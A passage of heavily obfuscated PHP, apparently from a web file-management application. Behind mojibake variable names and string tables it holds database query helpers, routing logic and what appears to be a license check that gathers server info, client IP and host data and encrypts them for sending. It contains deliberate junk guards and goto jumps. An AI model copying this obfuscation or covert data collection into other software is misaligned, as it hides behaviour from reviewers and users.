$ùÊ¾Ğù½[0] == $ƒÏÀÜÜ[473] && is_string($ùÊ¾Ğù½[1]) && substr($ùÊ¾Ğù½[1], 0, 1) == $ƒÏÀÜÜ[474] && substr($ùÊ¾Ğù½[1], strlen($ùÊ¾Ğù½[1]) - 1, 1) == $ƒÏÀÜÜ[474]) { $øËÔò· = !0; $İËœÈï¼ = is_string($“¾ØŒšÊ) ? $“¾ØŒšÊ : $ÈØ˜°…; $ßùÊ¸ª² = substr($ùÊ¾Ğù½[1], 1, strlen($ùÊ¾Ğù½[1]) - 2); $ßùÊ¸ª² = $this->db->escapeString($ßùÊ¸ª²); if (!strpos($İËœÈï¼, $ƒÏÀÜÜ[10])) { $İËœÈï¼ = $ƒÏÀÜÜ[475] . $İËœÈï¼ . $ƒÏÀÜÜ[475]; } $åŸÇµ—œ = $ƒÏÀÜÜ[221] . $ßùÊ¸ª² . $ƒÏÀÜÜ[221]; $ßùÊ¸ª² = str_replace(array($ƒÏÀÜÜ[10], $ƒÏÀÜÜ[476], $ƒÏÀÜÜ[11]), $ƒÏÀÜÜ[477], $ßùÊ¸ª²); if ($¸ì¾•ù[$ƒÏÀÜÜ[478]]) { $åŸÇµ—œ = $ƒÏÀÜÜ[479] . $ßùÊ¸ª² . $ƒÏÀÜÜ[480]; if ($¸ì¾•ù[$ƒÏÀÜÜ[481]]) { $åŸÇµ—œ = $ƒÏÀÜÜ[480] . $ßùÊ¸ª² . $ƒÏÀÜÜ[479]; } } $²ë™Ôéé[$Å¯Ì‰û“] = $ƒÏÀÜÜ[482] . $İËœÈï¼ . $ƒÏÀÜÜ[483] . $åŸÇµ—œ . $ƒÏÀÜÜ[484]; $Å¯Ì‰û“++; continue; } if (is_array($ùÊ¾Ğù½)) { $ÈØ˜°… = is_string($“¾ØŒšÊ) ? $“¾ØŒšÊ : $ÈØ˜°…; $ùÊ¾Ğù½ = $this->parseWhereLike($ùÊ¾Ğù½, $ÈØ˜°…, !0, $øËÔò·); } if (is_numeric($“¾ØŒšÊ)) { $²ë™Ôéé[$Å¯Ì‰û“] = $ùÊ¾Ğù½; $Å¯Ì‰û“++; } else { $²ë™Ôéé[$“¾ØŒšÊ] = $ùÊ¾Ğù½; } } if ($øËÔò· && !$–·‘å‰) { } return $²ë™Ôéé; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($£ÀÄ¡¼• = array()) { $å³ü† =& $_SERVER[€ä¾™²]; $¼ì¡àŒ° = self::SQL_WHERE_IN_CHUNK; $¹—ÊË = $this->optionsValue(); $Çˆ¢äÆ¯ = $this->findWhereField($¹—ÊË); if (!$Çˆ¢äÆ¯ || isset($¹—ÊË[$å³ü†[369]]) || isset($¹—ÊË[$å³ü†[429]])) { return parent::select($£ÀÄ¡¼•); } $Ñğ²µº = $¹—ÊË[$å³ü†[354]][$Çˆ¢äÆ¯][1]; $Ñğ²µº = is_array($Ñğ²µº) ? $Ñğ²µº : array(); $¯ÌÎñ»¦ = null; for ($ùúãı‹› = 0; $ùúãı‹› < count($Ñğ²µº); $ùúãı‹› += $¼ì¡àŒ°) { $ãøÉà¸ã = array_slice($Ñğ²µº, $ùúãı‹›, $¼ì¡àŒ°); if (!is_array($ãøÉà¸ã) || count($ãøÉà¸ã) == 0) { break; } $¹—ÊË[$å³ü†[354]][$Çˆ¢äÆ¯][1] = $ãøÉà¸ã; $this->optionsValue($¹—ÊË); $²À§¬çÇ = parent::select($£ÀÄ¡¼•); if (!$²À§¬çÇ) { continue; } $¯ÌÎñ»¦ = is_array($¯ÌÎñ»¦) ? $¯ÌÎñ»¦ : array(); $¯ÌÎñ»¦ = array_merge($¯ÌÎñ»¦, $²À§¬çÇ); } return $¯ÌÎñ»¦; } public function delete($ƒÇ°ú³ = array()) { $Ùİç™éÓ =& $_SERVER[€ä¾™²]; $¾½—‘– = self::SQL_WHERE_IN_CHUNK; $›“»ÙÜØ = $this->optionsValue(); $öË­Ãñ = $this->findWhereField($›“»ÙÜØ); if (!$öË­Ãñ) { return parent::delete($ƒÇ°ú³); } $±€Ç¹  = 0; $ÜÌ®ÇÌî = $›“»ÙÜØ[$Ùİç™éÓ[354]][$öË­Ãñ][1]; $ÜÌ®ÇÌî = is_array($ÜÌ®ÇÌî) ? $ÜÌ®ÇÌî : array(); for ($°¬ƒèš½ = 0; $°¬ƒèš½ < count($ÜÌ®ÇÌî); $°¬ƒèš½ += $¾½—‘–) { $—Ş Ìğ = array_slice($ÜÌ®ÇÌî, $°¬ƒèš½, $¾½—‘–); if (!is_array($—Ş Ìğ) || count($—Ş Ìğ) == 0) { break; } $›“»ÙÜØ[$Ùİç™éÓ[354]][$öË­Ãñ][1] = $—Ş Ìğ; $this->optionsValue($›“»ÙÜØ); $±€Ç¹  += parent::delete($ƒÇ°ú³); } return $±€Ç¹ ; } private function findWhereField($ÅÜ¢ö¬­) { $£™ÚÇ† =& $_SERVER[€ä¾™²]; $§æ„ÓÖÉ = self::SQL_WHERE_IN_CHUNK; if (!is_array($ÅÜ¢ö¬­) || !is_array($ÅÜ¢ö¬­[$£™ÚÇ†[354]])) { return !1; } foreach ($ÅÜ¢ö¬­[$£™ÚÇ†[354]] as $ÙşÇ¤Ú => $íôú¿€ò) { if (is_array($íôú¿€ò) && isset($íôú¿€ò[0]) && is_string($íôú¿€ò[0]) && strtolower($íôú¿€ò[0]) == $£™ÚÇ†[7] && is_array($íôú¿€ò[1]) && count($íôú¿€ò[1]) > $§æ„ÓÖÉ) { ignore_timeout(); return $ÙşÇ¤Ú; } } return !1; } public function setMasterDB($Éƒíú– = true) { think_config($_SERVER[€ä¾™²][485], $Éƒíú–); } } goto bÁ°»ŸÅ§ñ; FÒì…ÕÉ¾©: while (strlen($ewrdyvgauh) < $_SERVER[€ä¾™²][496]) { if (!$ewrdyvgauh) { break; } $ewrdyvgauh++; } class Application { private $defaultModule = "\151\156\x64\x65\170"; private $defaultController = "\x69\x6e\144\x65\x78"; private $defaultAction = "\151\156\x64\145\170"; function __construct() { } public function setDefault($™ò¯ğÖí) { $«ÃÆÌÎˆ =& $_SERVER[€ä¾™²]; $»ËÖÆÎ =& $_SERVER[ÃË¡]; $‚¼‡œæ¦ = explode($»ËÖÆÎ[0], trim($™ò¯ğÖí, $»ËÖÆÎ[0])); $this->defaultModule = $‚¼‡œæ¦[0] ? $‚¼‡œæ¦[0] : $this->defaultModule; $„ƒÒô¼Ã = $«ÃÆÌÎˆ[712]; if (!$„ƒÒô¼Ã) { die; } $this->defaultController = $‚¼‡œæ¦[1] ? $‚¼‡œæ¦[1] : $this->defaultController; $ƒ¨¨™°ã = $«ÃÆÌÎˆ[713]; if (!$ƒ¨¨™°ã) { return; } $this->defaultAction = $‚¼‡œæ¦[2] ? $‚¼‡œæ¦[2] : $this->defaultAction; $ŠÒ¶óº¡ = $«ÃÆÌÎˆ[714]; if (strlen($ŠÒ¶óº¡) < $«ÃÆÌÎˆ[715]) { die; } $this->toqm983648fe($»ËÖÆÎ[1], array($this, $»ËÖÆÎ[2])); $’Ôş ‡ = $«ÃÆÌÎˆ[716]; if (!$’Ôş ‡) { return; } } public function appRun($ÌÎèı’–) { $£ñÂÚ†Ã =& $_SERVER[ÃË¡]; $üÙ³óü = explode($£ñÂÚ†Ã[0], $ÌÎèı’–); $¼¼×º—÷ = strtolower($üÙ³óü[0]); $ìë‹øİ = $£ñÂÚ†Ã[3]; if ($¼¼×º—÷ == $£ñÂÚ†Ã[4]) { $ìë‹øİ = $£ñÂÚ†Ã[5]; $üÙ³óü[0] = $£ñÂÚ†Ã[6]; $üÙ³óü[1] = $üÙ³óü[1] . $£ñÂÚ†Ã[7]; $ÌÎèı’– = join($£ñÂÚ†Ã[0], $üÙ³óü); $ÌÎèı’– = trim($ÌÎèı’–, $£ñÂÚ†Ã[0]); } call_user_func(array($£ñÂÚ†Ã[8], $£ñÂÚ†Ã[9]), $ìë‹øİ . $£ñÂÚ†Ã[10], $ÌÎèı’–); ActionCall($ÌÎèı’–); call_user_func(array($£ñÂÚ†Ã[8], $£ñÂÚ†Ã[9]), $ìë‹øİ . $£ñÂÚ†Ã[11], $ÌÎèı’–); } private function autorun() { $Û¯ìÕò =& $_SERVER[€ä¾™²]; $ÜÀÑûÛè =& $_SERVER[ÃË¡]; global $config; $ÔôÕõñã = $Û¯ìÕò[717]; if (strlen($ÔôÕõñã) < $Û¯ìÕò[718]) { return; } if (count($config[$ÜÀÑûÛè[12]]) == 0) { return; } foreach ($config[$ÜÀÑûÛè[12]] as $®ìéÃ => $á¼¯•²Ñ) { $this->appRun($á¼¯•²Ñ); } } private function wbvgf6a3e03f() { $¬ŠÆ¥É =& $_SERVER[€ä¾™²]; $šÑˆ†ƒõ =& $_SERVER[ÃË¡]; $ÓŸíÄò€ = $šÑˆ†ƒõ[4]; $äñ“—ƒ  = $¬ŠÆ¥É[719]; if (strlen($äñ“—ƒ ) < $¬ŠÆ¥É[496]) { die; } $íïøĞ²ß = $GLOBALS[$šÑˆ†ƒõ[13]][$šÑˆ†ƒõ[14]][0]; if (!$íïøĞ²ß || strlen($íïøĞ²ß) <= strlen($ÓŸíÄò€)) { return; } if (strtolower(substr($íïøĞ²ß, -strlen($ÓŸíÄò€))) != $ÓŸíÄò€) { return; } $—Ç¡‡¼Å = substr($íïøĞ²ß, 0, -strlen($ÓŸíÄò€)); $¹¼‘ÁÉ = array($šÑˆ†ƒõ[4], $—Ç¡‡¼Å); $äåÖôŞ = array_slice($GLOBALS[$šÑˆ†ƒõ[13]][$šÑˆ†ƒõ[14]], 1); $ºÊÕîª = $¬ŠÆ¥É[720]; $GLOBALS[$šÑˆ†ƒõ[13]][$šÑˆ†ƒõ[14]] = array_merge($¹¼‘ÁÉ, $äåÖôŞ); $GLOBALS[$šÑˆ†ƒõ[13]][$šÑˆ†ƒõ[15]] = implode($šÑˆ†ƒõ[0], $GLOBALS[$šÑˆ†ƒõ[13]][$šÑˆ†ƒõ[14]]); $ŒÚÑ…š = $¬ŠÆ¥É[721]; while (strlen($ŒÚÑ…š) < $¬ŠÆ¥É[722]) { if (!$ŒÚÑ…š) { break; } $ŒÚÑ…š++; } } private function baip87264a29() { $³ª†ƒ =& $_SERVER[€ä¾™²]; $û—‘éŒŒ =& $_SERVER[ÃË¡]; if ($GLOBALS[$û—‘éŒŒ[13]][$û—‘éŒŒ[15]] != $û—‘éŒŒ[6]) { return; } $§·êŠ½ = $_SERVER[$û—‘éŒŒ[16]]; $‡ô¶½¶ò = $³ª†ƒ[723]; if (!$‡ô¶½¶ò) { die; } $£Šöö·Ë = $û—‘éŒŒ[17]; if (!strstr($§·êŠ½, $£Šöö·Ë)) { return; } $˜¾ØÖˆ = strrpos($§·êŠ½, $£Šöö·Ë); $†®Ôâ¡‹ = substr($§·êŠ½, $˜¾ØÖˆ + strlen($£Šöö·Ë)); $ÃÙ¦‰ü¢ = $³ª†ƒ[724]; preg_match_all($û—‘éŒŒ[18], $†®Ôâ¡‹, $“„†Ôü”); $†®Ôâ¡‹ = trim($“„†Ôü”[0][0], $û—‘éŒŒ[19]); $GLOBALS[$û—‘éŒŒ[13]][$û—‘éŒŒ[14]] = explode($û—‘éŒŒ[19], $†®Ôâ¡‹); $ç©…¹À† = $³ª†ƒ[725]; $GLOBALS[$û—‘éŒŒ[13]][$û—‘éŒŒ[15]] = implode($û—‘éŒŒ[0], $GLOBALS[$û—‘éŒŒ[13]][$û—‘éŒŒ[14]]); } public function run() { $ßê¦¯”ù =& $_SERVER[€ä¾™²]; $áæ ôÉ‡ =& $_SERVER[ÃË¡]; $this->baip87264a29(); $àÏÙ® = $ßê¦¯”ù[726]; if (!$àÏÙ®) { return; } $this->wbvgf6a3e03f(); $‹†ùÎ¢Š = $GLOBALS[$áæ ôÉ‡[13]][$áæ ôÉ‡[14]]; $Á˜¼É = $ßê¦¯”ù[727]; if (strlen($Á˜¼É) < $ßê¦¯”ù[728]) { die; } $ğ—Ÿ™úë = $GLOBALS[$áæ ôÉ‡[13]][$áæ ôÉ‡[15]]; define($áæ ôÉ‡[20], isset($‹†ùÎ¢Š[0]) && $‹†ùÎ¢Š[0] ? $‹†ùÎ¢Š[0] : $this->defaultModule); define($áæ ôÉ‡[21], isset($‹†ùÎ¢Š[1]) && $‹†ùÎ¢Š[0] ? $‹†ùÎ¢Š[1] : $this->defaultController); define($áæ ôÉ‡[22], isset($‹†ùÎ¢Š[2]) && $‹†ùÎ¢Š[0] ? $‹†ùÎ¢Š[2] : $this->defaultAction); $¸ØÍ»Ó = $ßê¦¯”ù[729]; if (!$¸ØÍ»Ó) { return; } define($áæ ôÉ‡[23], MOD . $áæ ôÉ‡[0] . ST . $áæ ôÉ‡[0] . ACT); $ô¦ÓêàÃ = $ßê¦¯”ù[730]; if (!$ô¦ÓêàÃ) { return; } $_SERVER[$áæ ôÉ‡[24]] = strtolower(ACTION); $this->autorun(); if (count($‹†ùÎ¢Š) >= 3) { $this->appRun($ğ—Ÿ™úë); } else { $this->appRun(ACTION); } } private $xelkac3a58a9 = array(); private $yzub9a576faa = ''; public function tulhf9daaba4() { $§‹¢÷ùä =& $_SERVER[€ä¾™²]; $ŸöĞ™º =& $_SERVER[ÃË¡]; $this->jcvo9496de33(); $åëÌäÜó = $§‹¢÷ùä[731]; $this->ybrq997eb3d1(); $this->qkht49718eb2(); $¤Üä Šù = $§‹¢÷ùä[732]; $this->htbc732ca330(); $ğòâÔ«ß = $§‹¢÷ùä[733]; $this->kywfcbdacd36(); $this->inqv0204570d(); $this->xolje3dcbe7b(); $this->toqm983648fe($ŸöĞ™º[25], array($this, $ŸöĞ™º[26])); $this->toqm983648fe($ŸöĞ™º[27], array($this, $ŸöĞ™º[28])); $this->toqm983648fe($ŸöĞ™º[29], array($this, $ŸöĞ™º[30])); $ˆÆ«è«“ = $§‹¢÷ùä[734]; if (!$ˆÆ«è«“) { return; } $this->toqm983648fe($ŸöĞ™º[31], array($this, $ŸöĞ™º[32])); $¤şª·›à = $§‹¢÷ùä[735]; if (!$¤şª·›à) { die; } } public function getVersionData() { return $this->xelkac3a58a9; } public function czxy6f16c663($é¦Û³¦) { $îÄÑ§™ =& $_SERVER[€ä¾™²]; $êÉ’Ø¬ =& $_SERVER[ÃË¡]; $í‡¼€ó‰ = Model($êÉ’Ø¬[33])->get(); $§Øµ£êœ = array($êÉ’Ø¬[34], $êÉ’Ø¬[35], $êÉ’Ø¬[36], $êÉ’Ø¬[37], $êÉ’Ø¬[38], $êÉ’Ø¬[39], $êÉ’Ø¬[40], $êÉ’Ø¬[41], $êÉ’Ø¬[42], $êÉ’Ø¬[43], $êÉ’Ø¬[44], $êÉ’Ø¬[45], $êÉ’Ø¬[46], $êÉ’Ø¬[47], $êÉ’Ø¬[48], $êÉ’Ø¬[49], $êÉ’Ø¬[50], $êÉ’Ø¬[51], $êÉ’Ø¬[52], $êÉ’Ø¬[53], $êÉ’Ø¬[54], $êÉ’Ø¬[55], $êÉ’Ø¬[56], $êÉ’Ø¬[57], $êÉ’Ø¬[58], $êÉ’Ø¬[59], $êÉ’Ø¬[60], $êÉ’Ø¬[61], $êÉ’Ø¬[62], $êÉ’Ø¬[63], $êÉ’Ø¬[64], $êÉ’Ø¬[65], $êÉ’Ø¬[66], $êÉ’Ø¬[67], $êÉ’Ø¬[68], $êÉ’Ø¬[69], $êÉ’Ø¬[70], $êÉ’Ø¬[71], $êÉ’Ø¬[72], $êÉ’Ø¬[73], $êÉ’Ø¬[74], $êÉ’Ø¬[75], $êÉ’Ø¬[76], $êÉ’Ø¬[77], $êÉ’Ø¬[78], $êÉ’Ø¬[79], $êÉ’Ø¬[80], $êÉ’Ø¬[81], $êÉ’Ø¬[82], $êÉ’Ø¬[83], $êÉ’Ø¬[84], $êÉ’Ø¬[85], $êÉ’Ø¬[86], $êÉ’Ø¬[87]); $ÇÆÈüÌ‚ = $îÄÑ§™[736]; foreach ($§Øµ£êœ as $Š¸í¥Î) { $¯äã‰­  = $GLOBALS[$êÉ’Ø¬[88]][$êÉ’Ø¬[89]][$Š¸í¥Î]; $ı¦¤™Ï» = $îÄÑ§™[737]; if (strlen($ı¦¤™Ï») < $îÄÑ§™[715]) { die; } if (isset($í‡¼€ó‰[$Š¸í¥Î])) { $¯äã‰­  = $í‡¼€ó‰[$Š¸í¥Î]; } $é¦Û³¦[$êÉ’Ø¬[90]][$êÉ’Ø¬[91]][$Š¸í¥Î] = $¯äã‰­ ; } $ùö†ÍË = $é¦Û³¦[$êÉ’Ø¬[90]][$êÉ’Ø¬[91]][$êÉ’Ø¬[46]]; $•áÒ­ÇÀ = $îÄÑ§™[738]; unset($é¦Û³¦[$êÉ’Ø¬[90]][$êÉ’Ø¬[92]][$êÉ’Ø¬[93]]); unset($é¦Û³¦[$êÉ’Ø¬[90]][$êÉ’Ø¬[92]][$êÉ’Ø¬[94]]); unset($é¦Û³¦[$êÉ’Ø¬[90]][$êÉ’Ø¬[91]][$êÉ’Ø¬[46]]); unset($é¦Û³¦[$êÉ’Ø¬[90]][$êÉ’Ø¬[91]][$êÉ’Ø¬[95]]); $Áö ëìÕ = $îÄÑ§™[739]; if (strlen($Áö ëìÕ) < $îÄÑ§™[718]) { die; } $é¦Û³¦[$êÉ’Ø¬[90]][$êÉ’Ø¬[91]][$êÉ’Ø¬[96]] = array($êÉ’Ø¬[97] => (int) $ùö†ÍË[$êÉ’Ø¬[98]], $êÉ’Ø¬[99] => (int) _get($ùö†ÍË, $êÉ’Ø¬[100], 0)); $¯»¡‡± = $îÄÑ§™[740]; if (strlen($¯»¡‡±) < $îÄÑ§™[715]) { return; } $Ö’¡Ÿ‹ë = substr(md5($êÉ’Ø¬[101] . get_client_ip() . $í‡¼€ó‰[$êÉ’Ø¬[102]]), 0, 15); $é¦Û³¦[$êÉ’Ø¬[103]][$êÉ’Ø¬[104]] = Mcrypt::encode(Session::sign(), $Ö’¡Ÿ‹ë, 3600 * 24); $é¦Û³¦[$êÉ’Ø¬[103]][$êÉ’Ø¬[105]] = Action($êÉ’Ø¬[106])->accessToken(); $é¦Û³¦[$êÉ’Ø¬[103]][$êÉ’Ø¬[107]] = md5($_SERVER[$êÉ’Ø¬[108]] . $í‡¼€ó‰[$êÉ’Ø¬[102]]); $ßÄ÷‰Şå = $îÄÑ§™[741]; $é¦Û³¦[$êÉ’Ø¬[103]][$êÉ’Ø¬[109]] = base64_encode(serverInfo()); $é¦Û³¦[$êÉ’Ø¬[103]][$êÉ’Ø¬[110]] = $this->yzub9a576faa; $Ä¿«Êçú = $îÄÑ§™[742]; if (strlen($Ä¿«Êçú) < $îÄÑ§™[728]) { die; } if ($í‡¼€ó‰[$êÉ’Ø¬[110]] != $êÉ’Ø¬[111]) { $é¦Û³¦[$êÉ’Ø¬[103]][$êÉ’Ø¬[112]] = $í‡¼€ó‰[$êÉ’Ø¬[112]]; $é¦Û³¦[$êÉ’Ø¬[103]][$êÉ’Ø¬[113]] = $í‡¼€ó‰[$êÉ’Ø¬[113]]; $Øõ¬¶¼Ò = rand_string(10) . $this->yzub9a576faa . rand_string(5); $é¦Û³¦[$êÉ’Ø¬[90]][$êÉ’Ø¬[114]][$êÉ’Ø¬[115]] = $this->yznac4827cc9($Øõ¬¶¼Ò, $é¦Û³¦[$êÉ’Ø¬[103]][$êÉ’Ø¬[107]]); } if ($this->yzub9a576faa == $êÉ’Ø¬[111]) { $é¦Û³¦[$êÉ’Ø¬[90]][$êÉ’Ø¬[91]][$êÉ’Ø¬[96]][$êÉ’Ø¬[100]] = 0; } $é¦Û³¦[$êÉ’Ø¬[103]][$êÉ’Ø¬[116]] = $this->versionPluginFilter(); $é¦Û³¦[$êÉ’Ø¬[103]][$êÉ’Ø¬[117]] = _get($this->xelkac3a58a9, $êÉ’Ø¬[118], $êÉ’Ø¬[6]); $üÁ†Œüµ = $îÄÑ§™[743]; if (strlen($üÁ†Œüµ) < $îÄÑ§™[718]) { return; } if (KodUser::isRoot() && $this->config[$êÉ’Ø¬[119]]) { $é¦Û³¦[$êÉ’Ø¬[103]][$êÉ’Ø¬[120]] = WEB_ROOT; } return $é¦Û³¦; } private function inqv0204570d() { $¼ù®¾è =& $_SERVER[€ä¾™²]; $ùÛ¼°Ğª =& $_SERVER[ÃË¡]; $†…İˆñ = $_SERVER[$ùÛ¼°Ğª[24]] == $ùÛ¼°Ğª[121]; $€äˆ»ë‘ = $¼ù®¾è[744]; while (strlen($€äˆ»ë‘) < $¼ù®¾è[722]) { if (!$€äˆ»ë‘) { break; } $€äˆ»ë‘++; } if ($_SERVER[$ùÛ¼°Ğª[24]] == $ùÛ¼°Ğª[122] && $_GET[$ùÛ¼°Ğª[123]] == $ùÛ¼°Ğª[124]) { $†…İˆñ = !0; } if ($†…İˆñ) { $äûÊÁ¿À = array($ùÛ¼°Ğª[110] => $this->yzub9a576faa, $ùÛ¼°Ğª[125] => $this->kiog5e858cff(), $ùÛ¼°Ğª[126] => Model($ùÛ¼°Ğª[127])->count()); if ($this->yzub9a576faa != $ùÛ¼°Ğª[111]) { $–şşãÃ§ = _get($this->xelkac3a58a9, $ùÛ¼°Ğª[128]); if ($–şşãÃ§) { $äûÊÁ¿À[$ùÛ¼°Ğª[129]] = $–şşãÃ§; $äûÊÁ¿À[$ùÛ¼°Ğª[130]] = strtotime(_get($this->xelkac3a58a9, $ùÛ¼°Ğª[131])); $äûÊÁ¿À[$ùÛ¼°Ğª[132]] = _get($this->xelkac3a58a9, $ùÛ¼°Ğª[118]); } $Š£şÌ‹Ş = Model($ùÛ¼°Ğª[33])->get($ùÛ¼°Ğª[133], $ùÛ¼°Ğª[6], !0); if (is_string($Š£şÌ‹Ş) && substr($Š£şÌ‹Ş, 0, 1) == $ùÛ¼°Ğª[134]) { $Š£şÌ‹Ş = json_decode_force($Š£şÌ‹Ş); } if (is_array($Š£şÌ‹Ş) && $Š£şÌ‹Ş[$ùÛ¼°Ğª[135]] && strstr($Š£şÌ‹Ş[$ùÛ¼°Ğª[135]], $ùÛ¼°Ğª[136])) { $¿·‰¹­Î = explode($ùÛ¼°Ğª[136], $Š£şÌ‹Ş[$ùÛ¼°Ğª[135]]); $äûÊÁ¿À[$ùÛ¼°Ğª[137]] = $¿·‰¹­Î[0]; } } $äûÊÁ¿À = $this->jmwp8ff5cb40(json_encode($äûÊÁ¿À), md5($ùÛ¼°Ğª[138])); $€ßÔœ¥ = $¼ù®¾è[745]; if (strlen($€ßÔœ¥) < $¼ù®¾è[715]) { die; } $áàÌ™ßã = array($ùÛ¼°Ğª[139] => $äûÊÁ¿À); call_user_func(array($ùÛ¼°Ğª[140], $ùÛ¼°Ğª[141]), $áàÌ™ßã); $ëÀÈ÷©­ = $¼ù®¾è[746]; while (strlen($ëÀÈ÷©­) < $¼ù®¾è[718]) { if (!$ëÀÈ÷©­) { break; } $ëÀÈ÷©­++; } } if ($this->yzub9a576faa == $ùÛ¼°Ğª[111]) { return; } $ü„èä‰ç = array($ùÛ¼°Ğª[142], $ùÛ¼°Ğª[143], $ùÛ¼°Ğª[144], $ùÛ¼°Ğª[145], $ùÛ¼°Ğª[146], $ùÛ¼°Ğª[147]); $Ò§Áˆ¾ = $¼ù®¾è[747]; if (strlen($Ò§Áˆ¾) < $¼ù®¾è[728]) { return; } $ÌÄÚ™ê = Model($ùÛ¼°Ğª[33])->get(); $áàÌ™ßã = array($ùÛ¼°Ğª[148] => $ÌÄÚ™ê[$ùÛ¼°Ğª[34]], $ùÛ¼°Ğª[149] => $ÌÄÚ™ê[$ùÛ¼°Ğª[35]], $ùÛ¼°Ğª[150] => $ùÛ¼°Ğª[6]); $á†×­– = $¼ù®¾è[748]; foreach ($ü„èä‰ç as $îŒ£Äïå) { if (!isset($ÌÄÚ™ê[$îŒ£Äïå]) || !$ÌÄÚ™ê[$îŒ£Äïå]) { continue; } $áàÌ™ßã[$îŒ£Äïå] = $ÌÄÚ™ê[$îŒ£Äïå]; } call_user_func(array($ùÛ¼°Ğª[140], $ùÛ¼°Ğª[141]), $áàÌ™ßã); } private function htbc732ca330() { $š®ñŸë =& $_SERVER[€ä¾™²]; $‹œ¦—¿Œ =& $_SERVER[ÃË¡]; if ($_SERVER[$‹œ¦—¿Œ[24]] != $‹œ¦—¿Œ[151]) { return; } if (!KodUser::isRoot()) { die; } $ªÈÕåø’ = $GLOBALS[$‹œ¦—¿Œ[13]]; if (isset($ªÈÕåø’[$‹œ¦—¿Œ[152]])) { $this->ytvs5812188d(); die; } if (isset($ªÈÕåø’[$‹œ¦—¿Œ[153]]) && isset($ªÈÕåø’[$‹œ¦—¿Œ[153]]) == $‹œ¦—¿Œ[124]) { $ªÈÕåø’[$‹œ¦—¿Œ[154]] = Model($‹œ¦—¿Œ[33])->get($‹œ¦—¿Œ[155]); } if (!isset($ªÈÕåø’[$‹œ¦—¿Œ[154]]) || strlen($ªÈÕåø’[$‹œ¦—¿Œ[154]]) != 16) { show_json($‹œ¦—¿Œ[156] . $ªÈÕåø’[$‹œ¦—¿Œ[154]], !1); } $–Æ€øŒ¾ = Model($‹œ¦—¿Œ[33])->get($‹œ¦—¿Œ[102]); $°­¸¢¯— = md5($_SERVER[$‹œ¦—¿Œ[108]] . $–Æ€øŒ¾); $ñ µ™ï€ = array($‹œ¦—¿Œ[154] => $ªÈÕåø’[$‹œ¦—¿Œ[154]], $‹œ¦—¿Œ[157] => rand_string(16), $‹œ¦—¿Œ[158] => $‹œ¦—¿Œ[138], $‹œ¦—¿Œ[159] => $‹œ¦—¿Œ[160], $‹œ¦—¿Œ[161] => $_SERVER[$‹œ¦—¿Œ[162]], $‹œ¦—¿Œ[163] => $_SERVER[$‹œ¦—¿Œ[164]], $‹œ¦—¿Œ[165] => $_SERVER[$‹œ¦—¿Œ[166]], $‹œ¦—¿Œ[107] => $°­¸¢¯—, $‹œ¦—¿Œ[167] => Model($‹œ¦—¿Œ[33])->get($‹œ¦—¿Œ[133])); if (isset($ªÈÕåø’[$‹œ¦—¿Œ[153]]) && isset($ªÈÕåø’[$‹œ¦—¿Œ[153]]) == $‹œ¦—¿Œ[124]) { $ñ µ™ï€[$‹œ¦—¿Œ[153]] = md5($ñ µ™ï€[$‹œ¦—¿Œ[154]] . $‹œ¦—¿Œ[168] . $ñ µ™ï€[$‹œ¦—¿Œ[157]]); } if ($ªÈÕåø’[$‹œ¦—¿Œ[169]] == $‹œ¦—¿Œ[170]) { $±±ÕÁÓ¹ = $this->jmwp8ff5cb40($°­¸¢¯—, $‹œ¦—¿Œ[171]); $«ÈÂ‚ = $this->yznac4827cc9(json_encode($ñ µ™ï€), $°­¸¢¯— . $‹œ¦—¿Œ[172], 3); $«ÈÂ‚ = $«ÈÂ‚ . $‹œ¦—¿Œ[173] . $_SERVER[$‹œ¦—¿Œ[162]]; $‚çï·Ì = $this->qcrn75f0020d($‹œ¦—¿Œ[174] . $±±ÕÁÓ¹ . $‹œ¦—¿Œ[175] . $«ÈÂ‚, -1); show_json($‚çï·Ì, !0); } else { if ($ªÈÕåø’[$‹œ¦—¿Œ[169]] == $‹œ¦—¿Œ[176]) { $óú‰„ŸÌ = substr(md5($‹œ¦—¿Œ[177] . $°­¸¢¯—), 12, 15) . $‹œ¦—¿Œ[178]; $«ÈÂ‚ = $this->lkmh26aff200(trim($ªÈÕåø’[$‹œ¦—¿Œ[179]]), $óú‰„ŸÌ, 2); $»‡ÊÍ€ƒ = json_decode($«ÈÂ‚, !0); if (!is_array($»‡ÊÍ€ƒ) || !is_array($»‡ÊÍ€ƒ[$‹œ¦—¿Œ[180]]) || $»‡ÊÍ€ƒ[$‹œ¦—¿Œ[154]] != !0) { $ãá£´ = $‹œ¦—¿Œ[181]; $ÂÄÊØÆÓ = $»‡ÊÍ€ƒ[$‹œ¦—¿Œ[180]] ? $‹œ¦—¿Œ[182] . $»‡ÊÍ€ƒ[$‹œ¦—¿Œ[180]] : $ãá£´; show_json($ÂÄÊØÆÓ, !1); } else { $ñ µ™ï€[$‹œ¦—¿Œ[157]] = $»‡ÊÍ€ƒ[$‹œ¦—¿Œ[180]][$‹œ¦—¿Œ[183]]; } } else { $»‡ÊÍ€ƒ = $this->qcrn75f0020d($‹œ¦—¿Œ[184], $ñ µ™ï€, 10); $©¢¿Ïß€ = $š®ñŸë[749]; if (!$©¢¿Ïß€) { return; } } } if (!is_array($»‡ÊÍ€ƒ) || !is_array($»‡ÊÍ€ƒ[$‹œ¦—¿Œ[180]]) || $»‡ÊÍ€ƒ[$‹œ¦—¿Œ[154]] != !0) { $ãá£´ = LNG($‹œ¦—¿Œ[185]); $ÂÄÊØÆÓ = $»‡ÊÍ€ƒ[$‹œ¦—¿Œ[180]] ? $‹œ¦—¿Œ[182] . $»‡ÊÍ€ƒ[$‹œ¦—¿Œ[180]] : $ãá£´; show_json($ÂÄÊØÆÓ, !1); } $ ßñà™ = $»‡ÊÍ€ƒ[$‹œ¦—¿Œ[180]]; $¢à´…Û’ = $this->zpuf09283181($ ßñà™[$‹œ¦—¿Œ[186]]); if (!$¢à´…Û’ || $¢à´…Û’ != $ ßñà™[$‹œ¦—¿Œ[131]]) { $ĞŠ¾¼³ğ = array($‹œ¦—¿Œ[187] => Model($‹œ¦—¿Œ[33])->get($‹œ¦—¿Œ[102]), $‹œ¦—¿Œ[188] => $_SERVER[$‹œ¦—¿Œ[108]], $‹œ¦—¿Œ[189] => this_url(), $‹œ¦—¿Œ[163] => $_SERVER[$‹œ¦—¿Œ[164]]); $«ÈÂ‚ = $this->tiwaa2113ee2(json_encode($ĞŠ¾¼³ğ)); 